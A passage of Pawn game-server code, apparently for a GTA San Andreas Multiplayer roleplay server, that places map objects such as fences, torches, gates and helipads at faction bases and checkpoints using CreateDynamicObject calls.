	CreateDynamicObject(1281, 1301.8063964844, -1866.2396240234, 13.347257614136, 0, 0, 0);
	CreateDynamicObject(1281, 1302.0598144531, -1870.8815917969, 13.347257614136, 0, 0, 0);
	CreateDynamicObject(1281, 1290.9669189453, -1876.3804931641, 13.352896690369, 0, 0, 0);
	CreateDynamicObject(1281, 1302.1552734375, -1876.3165283203, 13.352896690369, 0, 0, 0);
	CreateDynamicObject(1281, 1290.970703125, -1870.3883056641, 13.347257614136, 0, 0, 0);
	CreateDynamicObject(1281, 1291.2794189453, -1865.8643798828, 13.347257614136, 0, 0, 0);
	CreateDynamicObject(643, 1296.4981689453, -1874.0516357422, 13.017346382141, 0, 0, 0);
	CreateDynamicObject(643, 1296.5693359375, -1868.6201171875, 13.017346382141, 0, 0, 0);
	CreateDynamicObject(983, 1301.5759277344, -1862.3165283203, 13.230429649353, 0, 0, 270);
	CreateDynamicObject(983, 1290.6713867188, -1862.2672119141, 13.230429649353, 0, 0, 270);
	CreateDynamicObject(2773, 1297.8903808594, -1863.4284667969, 13.064103126526, 0, 0, 322);
	CreateDynamicObject(2773, 1294.2143554688, -1863.3950195313, 13.064103126526, 0, 0, 35.997314453125);
	CreateDynamicObject(983, 1287.4357910156, -1880.1752929688, 13.236068725586, 0, 0, 180);
	CreateDynamicObject(1776, 1298.5115966797, -1880.1678466797, 13.646266937256, 0, 0, 182);
	CreateDynamicObject(1775, 1297.2154541016, -1880.1146240234, 13.643911361694, 0, 0, 180);
	CreateDynamicObject(1231, 1301.5502929688, -1862.2928466797, 15.277267456055, 0, 0, 0);
	CreateDynamicObject(1231, 1290.5443115234, -1862.2702636719, 15.277267456055, 0, 0, 0);
	CreateDynamicObject(983, 1376.5454101563, -1881.7703857422, 13.237580299377, 0, 0, 264);
	CreateDynamicObject(983, 1370.1872558594, -1881.1110839844, 13.236107826233, 0, 0, 263.99597167969);
	CreateDynamicObject(983, 1368.6242675781, -1880.9482421875, 13.235756874084, 0, 0, 263.99047851563);
	CreateDynamicObject(1231, 1376.4932861328, -1881.8039550781, 15.283758163452, 0, 0, 356);
	CreateDynamicObject(1231, 1368.5618896484, -1880.8916015625, 15.283414840698, 0, 0, 349.99548339844);
	CreateDynamicObject(982, 1287.4117431641, -1829.4525146484, 13.237483024597, 0, 0, 0);
	CreateDynamicObject(982, 1287.4077148438, -1807.0612792969, 13.24405002594, 0, 0, 0);
	CreateDynamicObject(982, 1274.5335693359, -1793.3767089844, 13.083199501038, 0, 0, 90);
	CreateDynamicObject(983, 1260.1640625, -1793.3928222656, 13.107747077942, 0, 0, 270);
	CreateDynamicObject(983, 1232.9532470703, -1825.3370361328, 13.272395133972, 0, 0, 270);
	CreateDynamicObject(983, 1224.7744140625, -1825.2927246094, 13.272459983826, 0, 0, 270);
	CreateDynamicObject(983, 1216.736328125, -1825.306640625, 13.272439002991, 0, 0, 270);
	CreateDynamicObject(983, 1208.8957519531, -1825.2824707031, 13.272475242615, 0, 0, 270);
	CreateDynamicObject(983, 1200.8861083984, -1825.3009033203, 13.272448539734, 0, 0, 270);
	CreateDynamicObject(983, 1193.2546386719, -1825.2922363281, 13.272461891174, 0, 0, 270);
	CreateDynamicObject(983, 1190.0477294922, -1822.1337890625, 13.260739326477, 0, 0, 180);
	CreateDynamicObject(983, 1190.0515136719, -1815.7663574219, 13.260745048523, 0, 0, 180);
	CreateDynamicObject(983, 1190.0509033203, -1812.6096191406, 13.260745048523, 0, 0, 179.99450683594);
	CreateDynamicObject(983, 1236.1246337891, -1820.6785888672, 13.279221534729, 0, 0, 179.99450683594);
	CreateDynamicObject(983, 1236.1456298828, -1812.6815185547, 13.29093837738, 0, 0, 179.99450683594);
	CreateDynamicObject(983, 1198.2064208984, -1837.3310546875, 13.256678581238, 0, 0, 270);
	CreateDynamicObject(983, 1199.8275146484, -1837.3494873047, 13.254431724548, 0, 0, 270);
	CreateDynamicObject(983, 1195.0101318359, -1834.1063232422, 13.266268730164, 0, 0, 179.99450683594);
	CreateDynamicObject(983, 1195.0130615234, -1829.3216552734, 13.263573646545, 0, 0, 179.99450683594);
	CreateDynamicObject(3666, 1194.8081054688, -1825.7407226563, 13.115976333618, 0, 0, 0);
	CreateDynamicObject(3666, 1204.0826416016, -1837.4578857422, 13.06955909729, 0, 0, 0);
	CreateDynamicObject(3666, 1203.6988525391, -1842.1923828125, 13.066823959351, 0, 0, 0);
	CreateDynamicObject(3666, 1223.8203125, -1842.271484375, 13.06056022644, 0, 0, 0);
	CreateDynamicObject(983, 1226.9571533203, -1837.4904785156, 13.270976066589, 0, 0, 270);
	CreateDynamicObject(983, 1233.3441162109, -1837.501953125, 13.270773887634, 0, 0, 270);
	CreateDynamicObject(983, 1239.7121582031, -1837.4992675781, 13.266272544861, 0, 0, 270);
	CreateDynamicObject(983, 1246.1385498047, -1837.5272216797, 13.264399528503, 0, 0, 270);
	CreateDynamicObject(983, 1252.4221191406, -1837.3950195313, 13.24675655365, 0, 0, 270);
	CreateDynamicObject(983, 1257.2119140625, -1837.3836669922, 13.244194984436, 0, 0, 270);
	CreateDynamicObject(983, 1284.1945800781, -1842.2836914063, 13.228772163391, 0, 0, 270);
	CreateDynamicObject(3666, 1223.5888671875, -1837.5812988281, 13.069229125977, 0, 0, 0);
	CreateDynamicObject(3666, 1260.142578125, -1837.7532958984, 13.058977127075, 0, 0, 0);
	CreateDynamicObject(3666, 1259.9665527344, -1842.0784912109, 13.076805114746, 0, 0, 0);
	CreateDynamicObject(3666, 1280.3946533203, -1842.1732177734, 13.087188720703, 0, 0, 0);
	CreateDynamicObject(1231, 1252.9938964844, -1841.9677734375, 15.316919326782, 0, 0, 0);
	CreateDynamicObject(1231, 1242.5729980469, -1842.0960693359, 15.299505233765, 0, 0, 0);
	CreateDynamicObject(1231, 1231.7780761719, -1842.1237792969, 15.295318603516, 0, 0, 0);
	CreateDynamicObject(1231, 1199.0712890625, -1842.0906982422, 15.311740875244, 0, 0, 0);
	CreateDynamicObject(1231, 1190.1539306641, -1842.1428222656, 15.320255279541, 0, 0, 0);
	CreateDynamicObject(1231, 1189.9285888672, -1834.1168212891, 15.300704956055, 0, 0, 268);
	CreateDynamicObject(1231, 1190.1104736328, -1825.5405273438, 15.320964813232, 0, 0, 267.99499511719);
	CreateDynamicObject(1231, 1280.3781738281, -1842.2850341797, 15.279340744019, 0, 0, 179.99499511719);
	CreateDynamicObject(3666, 1236.060546875, -1816.0998535156, 13.116060256958, 0, 0, 0);
	CreateDynamicObject(3666, 1236.0368652344, -1825.1246337891, 13.102836608887, 0, 0, 0);
	CreateDynamicObject(3666, 1228.1689453125, -1825.2387695313, 13.102670669556, 0, 0, 0);
	CreateDynamicObject(3666, 1221.3990478516, -1825.2287597656, 13.102684020996, 0, 0, 0);
	CreateDynamicObject(3666, 1212.3413085938, -1825.2725830078, 13.102621078491, 0, 0, 0);
	CreateDynamicObject(3666, 1205.3474121094, -1825.2340087891, 13.102676391602, 0, 0, 0);
	CreateDynamicObject(982, 1059.1430664063, -1764.1168212891, 13.240622520447, 0, 0, 0);
	CreateDynamicObject(982, 1102.1683349609, -1764.1756591797, 13.203336715698, 0, 0, 0);
	CreateDynamicObject(982, 1088.8211669922, -1777.2604980469, 13.203715324402, 0, 0, 90);
	CreateDynamicObject(982, 1072.7874755859, -1777.2686767578, 13.203919410706, 0, 0, 89.994506835938);
	CreateDynamicObject(982, 1072.9261474609, -1735.7808837891, 13.3736743927, 0, 0, 89.994506835938);
	CreateDynamicObject(982, 1098.5444335938, -1735.8441162109, 13.44093132019, 0, 0, 89.994506835938);
	CreateDynamicObject(982, 1124.1313476563, -1735.8500976563, 13.456992149353, 0, 0, 89.994506835938);
	CreateDynamicObject(982, 1119.3057861328, -1745.9907226563, 13.253867149353, 0, 0, 89.994506835938);
	CreateDynamicObject(982, 1144.8438720703, -1746.0327148438, 13.253867149353, 0, 0, 89.994506835938);
	CreateDynamicObject(982, 1149.7088623047, -1735.8211669922, 13.456992149353, 0, 0, 89.994506835938);
	CreateDynamicObject(983, 1160.9205322266, -1735.8228759766, 13.456992149353, 0, 0, 90);
	CreateDynamicObject(983, 1160.8322753906, -1746.0909423828, 13.253867149353, 0, 0, 89.994506835938);
	CreateDynamicObject(984, 1059.0766601563, -1744.9410400391, 13.25629234314, 0, 0, 0);
	CreateDynamicObject(983, 1059.1109619141, -1740.1285400391, 13.317593574524, 0, 0, 0);
	CreateDynamicObject(3666, 1059.4627685547, -1777.1745605469, 13.031704902649, 0, 0, 0);
	CreateDynamicObject(3666, 1101.8972167969, -1777.0985107422, 13.030601501465, 0, 0, 0);
	CreateDynamicObject(3666, 1101.896484375, -1777.09765625, 13.030601501465, 0, 0, 0);
	CreateDynamicObject(3666, 1102.2243652344, -1750.4031982422, 13.045902252197, 0, 0, 0);
	CreateDynamicObject(3666, 1103.1716308594, -1748.1320800781, 13.079196929932, 0, 0, 0);
	CreateDynamicObject(3666, 1105.7670898438, -1746.2209472656, 13.087428092957, 0, 0, 0);
	CreateDynamicObject(3666, 1059.2069091797, -1735.8656005859, 13.171046257019, 0, 0, 0);
	CreateDynamicObject(3666, 1216.3941650391, -1722.7170410156, 13.070556640625, 0, 0, 0);
	CreateDynamicObject(3666, 1211.5487060547, -1722.6658935547, 13.070306777954, 0, 0, 0);
	CreateDynamicObject(3666, 1225.6622314453, -1722.71484375, 13.070545196533, 0, 0, 0);
	CreateDynamicObject(3666, 1229.8852539063, -1722.6635742188, 13.070295333862, 0, 0, 0);
	CreateDynamicObject(3666, 1237.3260498047, -1722.7202148438, 13.070571899414, 0, 0, 0);
	CreateDynamicObject(3666, 1243.5894775391, -1722.6818847656, 13.070384979248, 0, 0, 0);
	CreateDynamicObject(3666, 1240.3292236328, -1722.7043457031, 13.07049369812, 0, 0, 0);
	CreateDynamicObject(983, 1164.9580078125, -1754.0443115234, 13.257978439331, 0, 0, 0);
	CreateDynamicObject(3666, 1164.9187011719, -1749.1864013672, 13.08399772644, 0, 0, 0);
	CreateDynamicObject(3666, 1164.9254150391, -1747.2734375, 13.08399772644, 0, 0, 0);
	CreateDynamicObject(3666, 1163.3778076172, -1758.7359619141, 13.142159461975, 0, 0, 0);



//Aztecas
	CreateDynamicObject(2001,2787.17138672,-1924.80163574,12.54687500,0.00000000,0.00000000,0.00000000); //object(nu_plant_ofc) (1)
	CreateDynamicObject(2001,2787.24414062,-1927.43200684,12.54687500,0.00000000,0.00000000,0.00000000); //object(nu_plant_ofc) (2)
	CreateDynamicObject(3593,2729.10449219,-1969.99243164,13.25704288,0.00000000,0.00000000,70.00000000); //object(la_fuckcar2) (1)
	CreateDynamicObject(3594,2731.55859375,-1914.12072754,13.17054081,0.00000000,0.00000000,30.00000000); //object(la_fuckcar1) (1)
	CreateDynamicObject(3461,2779.54345703,-1926.69091797,14.12188625,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (1)
	CreateDynamicObject(3461,2779.68945312,-1922.38635254,14.12188625,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (2)
	CreateDynamicObject(2057,2787.38134766,-1928.89465332,12.71732903,0.00000000,0.00000000,313.50000000); //object(flame_tins) (1)

//Triadenbase
	CreateDynamicObject(3749,-2803.01367188,-329.80957031,11.89747715,0.00000000,0.00000000,84.99572754); //object(clubgate01_lax) (1)
	CreateDynamicObject(4100,-2803.51757812,-314.64941406,7.88916969,0.00000000,0.00000000,45.49987793); //object(meshfence1_lan) (1)
	CreateDynamicObject(4100,-2806.36425781,-344.09179688,7.88916969,0.00000000,0.00000000,42.49511719); //object(meshfence1_lan) (2)
	CreateDynamicObject(4100,-2671.10424805,-220.59478760,5.04471207,0.00000000,0.00000000,320.00000000); //object(meshfence1_lan) (3)
	CreateDynamicObject(3749,-2655.48730469,-222.38574219,9.13244820,0.00000000,0.00000000,0.00000000); //object(clubgate01_lax) (2)
	CreateDynamicObject(4100,-2641.25024414,-220.47813416,5.04299927,0.00000000,0.00000000,321.99829102); //object(meshfence1_lan) (4)
	CreateDynamicObject(3525,-2718.60083008,-312.32562256,8.35556793,0.00000000,0.00000000,225.00000000); //object(exbrtorch01) (1)
	CreateDynamicObject(3525,-2726.24780273,-319.89517212,8.35556793,0.00000000,0.00000000,225.00000000); //object(exbrtorch01) (3)
	CreateDynamicObject(3461,-2750.82080078,-313.51513672,7.77025127,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (1)
	CreateDynamicObject(3461,-2774.94604492,-316.13870239,7.77025127,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (2)
	CreateDynamicObject(3461,-2728.67651367,-293.68167114,7.76251125,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (3)
	CreateDynamicObject(3461,-2782.68701172,-278.25140381,7.76251125,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (5)
	CreateDynamicObject(3461,-2748.62524414,-278.29064941,7.77025127,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (6)
	CreateDynamicObject(3461,-2720.46948242,-286.14544678,7.76251125,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (7)
	CreateDynamicObject(3928,-2612.42919922,-243.97673035,18.37186432,0.00000000,0.00000000,20.00000000); //object(helipad) (1)
	CreateDynamicObject(3928,-2611.51000977,-306.51480103,22.22980499,0.00000000,0.00000000,350.00000000); //object(helipad) (2)
	CreateDynamicObject(3461,-2619.30493164,-312.82156372,23.27027702,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (4)
	CreateDynamicObject(3461,-2616.71362305,-297.59454346,23.26943779,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (8)
	CreateDynamicObject(3461,-2603.34472656,-300.64553833,23.74020958,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (9)
	CreateDynamicObject(3461,-2605.68530273,-315.63961792,23.89440918,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (10)
	CreateDynamicObject(3461,-2616.98901367,-253.42684937,19.59257126,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (11)
	CreateDynamicObject(3461,-2622.41528320,-240.36135864,19.23400497,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (12)
	CreateDynamicObject(3461,-2607.93164062,-235.14263916,19.64953804,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (13)
	CreateDynamicObject(3461,-2602.86206055,-248.06858826,19.80954742,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (14)
	CreateDynamicObject(983,-2657.84277344,-275.75488281,7.17394447,0.00000000,0.00000000,314.99450684); //object(fenceshit3) (1)
	CreateDynamicObject(983,-2665.82128906,-283.76855469,6.99922085,0.00000000,0.00000000,314.99450684); //object(fenceshit3) (2)
	CreateDynamicObject(984,-2663.59570312,-290.56927490,6.99922085,0.00000000,0.00000000,45.00000000); //object(fenceshit2) (1)
	CreateDynamicObject(984,-2656.79882812,-297.37402344,6.98573303,0.00000000,0.00000000,44.98901367); //object(fenceshit2) (2)
	CreateDynamicObject(984,-2651.10620117,-278.03598022,7.07627487,0.00000000,0.00000000,44.99450684); //object(fenceshit2) (3)
	CreateDynamicObject(984,-2644.33496094,-284.83203125,7.07654762,0.00000000,0.00000000,44.98901367); //object(fenceshit2) (5)
	CreateDynamicObject(3461,-2663.52832031,-281.56231689,8.11407375,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (15)
	CreateDynamicObject(3461,-2660.09570312,-278.02246094,8.10886765,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (16)
	CreateDynamicObject(3461,-2644.36621094,-293.91204834,8.11636448,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (17)
	CreateDynamicObject(3461,-2647.72460938,-297.38757324,8.11407375,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (18)
	CreateDynamicObject(3524,-2663.18359375,-219.27023315,3.97127771,0.00000000,0.00000000,180.00000000); //object(skullpillar01_lvs) (1)
	CreateDynamicObject(3524,-2647.39843750,-219.56164551,3.97127771,0.00000000,0.00000000,179.99450684); //object(skullpillar01_lvs) (2)
	CreateDynamicObject(3524,-2806.85083008,-337.17492676,6.97127771,0.00000000,0.00000000,270.00000000); //object(skullpillar01_lvs) (3)
	CreateDynamicObject(3524,-2805.17285156,-321.65429688,6.97127771,0.00000000,0.00000000,270.00000000); //object(skullpillar01_lvs) (4)
	CreateDynamicObject(1360,-2716.44653320,-311.30166626,6.95088291,0.00000000,0.00000000,315.00000000); //object(cj_bush_prop3) (1)
	CreateDynamicObject(1360,-2727.13427734,-321.96337891,6.95481491,0.00000000,0.00000000,314.99450684); //object(cj_bush_prop3) (2)
	CreateDynamicObject(3525,1966.87866211,1061.54797363,995.51141357,0.00000000,0.00000000,332.00000000); //object(exbrtorch01) (2)
	CreateDynamicObject(3525,1960.64404297,1064.80249023,995.51141357,0.00000000,0.00000000,331.99584961); //object(exbrtorch01) (4)
	CreateDynamicObject(983,-2650.01293945,-299.65155029,6.98573303,0.00000000,0.00000000,314.99450684); //object(fenceshit3) (2)
	CreateDynamicObject(983,-2642.07397461,-291.60742188,7.07654762,0.00000000,0.00000000,314.99450684); //object(fenceshit3) (1)

	yaktor =	CreateDynamicObject(980,-2803.43945312,-329.79394531,8.81245422,0.00000000,0.00000000,85.49011230); //Tor 1 Zu
	yaktor2 =  	CreateDynamicObject(980,-2655.51562500,-222.05761719,6.05807400,0.00000000,0.00000000,0.00000000); //Tor 2 Zu



//Red Soldiers
	CreateDynamicObject(3749,1272.36816406,-1651.88769531,18.40528870,0.00000000,0.00000000,269.99951172); //object(clubgate01_lax) (1)
	CreateDynamicObject(3749,1283.64550781,-1652.15600586,18.40528870,0.00000000,0.00000000,269.99450684); //object(clubgate01_lax) (2)
	CreateDynamicObject(8613,1263.10400391,-1626.71264648,30.74642181,0.00000000,0.00000000,91.99951172); //object(vgssstairs03_lvs) (1)
	CreateDynamicObject(4874,1246.13183594,-1664.05273438,37.66331863,0.00000000,0.00000000,89.99450684); //object(helipad1_las) (1)
	CreateDynamicObject(11245,1287.46252441,-1644.35693359,19.75335693,0.00000000,0.00000000,0.00000000); //object(sfsefirehseflag) (2)
	CreateDynamicObject(11245,1286.40185547,-1659.74938965,19.76461411,0.00000000,0.00000000,0.00000000); //object(sfsefirehseflag) (3)
	CreateDynamicObject(3461,1280.75000000,-1656.65808105,14.12188625,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (3)
	CreateDynamicObject(3461,1273.94885254,-1656.62597656,14.12188625,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (4)
	CreateDynamicObject(3461,1277.04626465,-1659.93933105,21.17745590,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (5)
	CreateDynamicObject(3461,1280.74792480,-1646.75036621,14.12188625,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (6)
	CreateDynamicObject(3461,1273.99145508,-1646.65747070,14.12188625,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (7)
	CreateDynamicObject(3525,1231.70764160,-1661.27233887,12.47603321,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (1)
	CreateDynamicObject(3525,1241.35510254,-1661.44970703,12.60979366,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (2)
	CreateDynamicObject(3525,1251.45056152,-1661.56726074,12.98662186,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (3)
	CreateDynamicObject(3525,1260.82849121,-1661.66162109,14.18535709,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (4)
	CreateDynamicObject(3525,1246.35852051,-1644.61181641,12.53090000,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (5)
	CreateDynamicObject(3525,1230.27319336,-1644.61181641,12.54166126,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (6)
	CreateDynamicObject(3524,1285.68347168,-1618.90173340,29.26033974,0.00000000,0.00000000,132.00000000); //object(skullpillar01_lvs) (1)
	CreateDynamicObject(3524,1287.33203125,-1658.45825195,15.43221474,0.00000000,0.00000000,96.00000000); //object(skullpillar01_lvs) (2)
	CreateDynamicObject(3524,1287.31921387,-1646.60070801,15.43221474,0.00000000,0.00000000,95.99853516); //object(skullpillar01_lvs) (3)
	CreateDynamicObject(3524,1285.38623047,-1645.30859375,36.69002914,0.00000000,0.00000000,93.99523926); //object(skullpillar01_lvs) (4)
	CreateDynamicObject(3524,1288.70837402,-1691.03771973,41.32284164,0.00000000,0.00000000,93.99353027); //object(skullpillar01_lvs) (5)
	CreateDynamicObject(3524,1288.57519531,-1703.58081055,41.32284164,0.00000000,0.00000000,93.99353027); //object(skullpillar01_lvs) (6)
	CreateDynamicObject(3524,1285.66345215,-1661.49645996,36.69002914,0.00000000,0.00000000,93.99353027); //object(skullpillar01_lvs) (7)
	CreateDynamicObject(2238,1259.54418945,-1696.90295410,34.21258545,0.00000000,0.00000000,0.00000000); //object(cj_lava_lamp) (1)
	CreateDynamicObject(3525,1238.37805176,-1633.21984863,36.15187073,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (8)
	CreateDynamicObject(3525,1238.37805176,-1636.55114746,36.17975235,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (9)
	CreateDynamicObject(3525,1238.37805176,-1639.43615723,36.21276855,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (10)
	CreateDynamicObject(3525,1238.37805176,-1642.52136230,36.17672348,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (11)
	CreateDynamicObject(3525,1238.37805176,-1646.22192383,36.16235733,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (12)
	CreateDynamicObject(3525,1238.37792969,-1650.05847168,36.13534927,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (13)
	CreateDynamicObject(3525,1238.37792969,-1653.40942383,36.17725754,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (14)
	CreateDynamicObject(3525,1238.37792969,-1656.49926758,36.21287155,0.00000000,0.00000000,0.00000000); //object(exbrtorch01) (15)
	CreateDynamicObject(6865,1287.89916992,-1652.56542969,21.18230629,0.00000000,0.00000000,137.99475098); //object(steerskull) (2)
	CreateDynamicObject(2051,1250.90588379,-1638.18359375,15.20961094,0.00000000,0.00000000,0.00000000); //object(cj_target4) (1)
	CreateDynamicObject(16151,1252.44653320,-1638.76025391,12.54687500,0.00000000,0.00000000,92.00000000); //object(ufo_bar) (2)
	CreateDynamicObject(1668,1249.47778320,-1639.73706055,13.31899643,0.00000000,0.00000000,0.00000000); //object(propvodkabotl1) (1)
	CreateDynamicObject(1668,1249.86889648,-1639.83020020,13.31899643,0.00000000,0.00000000,0.00000000); //object(propvodkabotl1) (2)
	CreateDynamicObject(1668,1249.09094238,-1638.62292480,13.33899689,0.00000000,0.00000000,0.00000000); //object(propvodkabotl1) (3)
	CreateDynamicObject(1951,1250.58728027,-1639.97436523,13.34046078,0.00000000,0.00000000,0.00000000); //object(kb_beer01) (1)
	CreateDynamicObject(1951,1255.83520508,-1638.90075684,13.36046124,0.00000000,0.00000000,0.00000000); //object(kb_beer01) (2)
	CreateDynamicObject(1951,1250.22155762,-1638.15844727,14.26552773,0.00000000,0.00000000,0.00000000); //object(kb_beer01) (3)
	CreateDynamicObject(1951,1251.20068359,-1639.73937988,13.34046078,0.00000000,0.00000000,0.00000000); //object(kb_beer01) (4)
	CreateDynamicObject(1951,1249.99023438,-1638.24511719,14.26552773,0.00000000,0.00000000,0.00000000); //object(kb_beer01) (5)
	CreateDynamicObject(1950,1252.00659180,-1640.03759766,13.34046078,0.00000000,0.00000000,0.00000000); //object(kb_beer) (1)
	CreateDynamicObject(1950,1252.82727051,-1639.74438477,13.34046078,0.00000000,0.00000000,0.00000000); //object(kb_beer) (2)
	CreateDynamicObject(1950,1253.38183594,-1639.89379883,13.34046078,0.00000000,0.00000000,0.00000000); //object(kb_beer) (3)
	CreateDynamicObject(1950,1253.99572754,-1639.68127441,13.34046078,0.00000000,0.00000000,0.00000000); //object(kb_beer) (4)
	CreateDynamicObject(1950,1254.34423828,-1639.92822266,13.34046078,0.00000000,0.00000000,0.00000000); //object(kb_beer) (5)
	CreateDynamicObject(1950,1254.93457031,-1639.57482910,13.34046078,0.00000000,0.00000000,0.00000000); //object(kb_beer) (6)
	CreateDynamicObject(1950,1255.48742676,-1639.62780762,13.30046082,0.00000000,0.00000000,0.00000000); //object(kb_beer) (7)
	CreateDynamicObject(1950,1249.15441895,-1639.19555664,13.36046124,0.00000000,0.00000000,0.00000000); //object(kb_beer) (8)
	CreateDynamicObject(1950,1250.45800781,-1638.10815430,14.26552773,0.00000000,0.00000000,0.00000000); //object(kb_beer) (9)
	CreateDynamicObject(1696,1254.78125000,-1649.92187500,11.53970242,0.00000000,0.00000000,270.00000000); //object(roofstuff15) (1)
	CreateDynamicObject(1696,1244.80664062,-1649.88867188,10.69300461,0.00000000,0.00000000,269.74731445); //object(roofstuff15) (2)
	CreateDynamicObject(1696,1244.78710938,-1654.52539062,10.70672894,0.00000000,0.00000000,269.74182129); //object(roofstuff15) (3)
	CreateDynamicObject(1696,1254.77636719,-1655.31420898,11.53970242,0.00000000,0.00000000,269.99975586); //object(roofstuff15) (4)
	CreateDynamicObject(3472,1197.11401367,-1671.95117188,12.15625000,0.00000000,0.00000000,0.00000000); //object(circuslampost03) (1)
	CreateDynamicObject(3472,1197.49865723,-1693.86889648,12.15625000,0.00000000,0.00000000,0.00000000); //object(circuslampost03) (1)
	CreateDynamicObject(7922,1267.31433105,-1693.10705566,35.20202637,0.00000000,0.00000000,0.00000000); //object(vgwstnewall6905) (1)
	CreateDynamicObject(7922,1268.19592285,-1693.99658203,35.20202637,0.00000000,0.00000000,0.00000000); //object(vgwstnewall6905) (2)
	CreateDynamicObject(7922,1269.09472656,-1694.94836426,35.20202637,0.00000000,0.00000000,0.00000000); //object(vgwstnewall6905) (3)
	CreateDynamicObject(7922,1267.24963379,-1694.75085449,35.20202637,0.00000000,0.00000000,87.99993896); //object(vgwstnewall6905) (5)
	CreateDynamicObject(7922,1269.61718750,-1693.07507324,35.20202637,0.00000000,0.00000000,0.00000000); //object(vgwstnewall6905) (6)
	CreateDynamicObject(7922,1269.94470215,-1694.18688965,35.20202637,0.00000000,0.00000000,270.00000000); //object(vgwstnewall6905) (7)
	CreateDynamicObject(7922,1269.95690918,-1694.93872070,35.20202637,0.00000000,0.00000000,179.99444580); //object(vgwstnewall6905) (8)
	CreateDynamicObject(7922,1269.69653320,-1694.56628418,35.20202637,0.00000000,0.00000000,179.98901367); //object(vgwstnewall6905) (9)
	CreateDynamicObject(1696,1268.39245605,-1694.73864746,37.75865936,0.00000000,0.00000000,269.74731445); //object(roofstuff15) (2)

//Terrorgate
	  CreateDynamicObject(3749, -489.2790222168, -564.22210693359, 29.88106918335, 0, 0, 0);


//Präsileviint
      CreateDynamicObject(14404,1261.532,-796.095,1186.609,0.0,0.0,0.0);
	  CreateDynamicObject(2873, 1262.298, -794.677, 1185.981, 0.0, 0.0, -180.000);
	  CreateDynamicObject(2873, 1262.162, -804.213, 1186.031, 0.0, 0.0, -270.000);
	  CreateDynamicObject(1723, 1262.595, -799.911, 1184.757, 0.0, 0.0, -90.077);
	  CreateDynamicObject(2747, 1262.570, -798.632, 1185.222, 0.0, 0.0, -90.000);
	  CreateDynamicObject(1670, 1262.625, -798.756, 1185.654, 0.0, 0.0, 0.0);
	  CreateDynamicObject(1704, 1262.098, -796.868, 1184.813, 0.0, 0.0, -14.610);
	  CreateDynamicObject(1562, 1260.539, -799.577, 1185.439, 0.0, 0.0, -180.000);
	  CreateDynamicObject(1562, 1260.596, -801.793, 1185.489, 0.0, 0.0, -180.000);
	  CreateDynamicObject(1563, 1260.558, -799.904, 1185.964, 0.0, 0.0, 180.000);
	  CreateDynamicObject(1563, 1260.598, -802.131, 1186.002, 0.0, 0.0, 180.000);
	  CreateDynamicObject(1752, 1260.609, -794.519, 1186.640, 12.032, 0.859, 3.438);
	  CreateDynamicObject(2747, 1260.333, -798.326, 1185.072, 0.0, 0.0, 0.0);
	  CreateDynamicObject(2747, 1260.307, -800.633, 1185.072, 0.0, 0.0, 0.0);
	  CreateDynamicObject(2824, 1260.577, -798.378, 1185.493, 0.0, 0.0, 0.0);
	  CreateDynamicObject(2816, 1260.717, -800.669, 1185.493, 0.0, 0.0, -213.750);

	//wcc zäune
	  CreateDynamicObject(972, -2220.499512, 1014.103516, 78.394989, 348.8273, 357.4217, 270.0000);



	//Tank Schild
	  CreateDynamicObject(11417, 1005.865540, -951.640869, 46.072830, 0.0000, 0.0000, 326.2500);




// Gangjail
CreateDynamicObject(1495, -2810.96045, -1524.79700, 139.86142,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(1495, -2821.38379, -1519.45898, 139.86142,   0.00000, 0.00000, 90.00003);

fbi3333 = CreateObject(968, -1701.43323, 687.60760, 24.63350,   0.00000, -90.00000, 90.00000); //Schranke1
fbi2222 = CreateObject(968, -1572.20520, 658.78870, 6.85410,   0.00000, 90.00000, 90.00000);// Schranke2


// Zoll 1 LS LV
CreateDynamicObject(9623, 1746.57092, 517.29425, 29.77955,   -3.00000, 0.00000, -19.14000);
CreateDynamicObject(9623, 1729.48840, 523.17584, 29.77955,   -3.00000, 0.00000, -19.01999);
zolltor1 = CreateDynamicObject(978, 1750.53284, 515.92505, 27.70611,   0.00000, 0.00000, -19.37999);
zolltor2 = CreateDynamicObject(978, 1742.12573, 518.60272, 27.70611,   0.00000, 0.00000, -19.37999);
zolltor3 = CreateDynamicObject(978, 1733.37769, 521.50671, 27.70611,   0.00000, 0.00000, -19.37999);
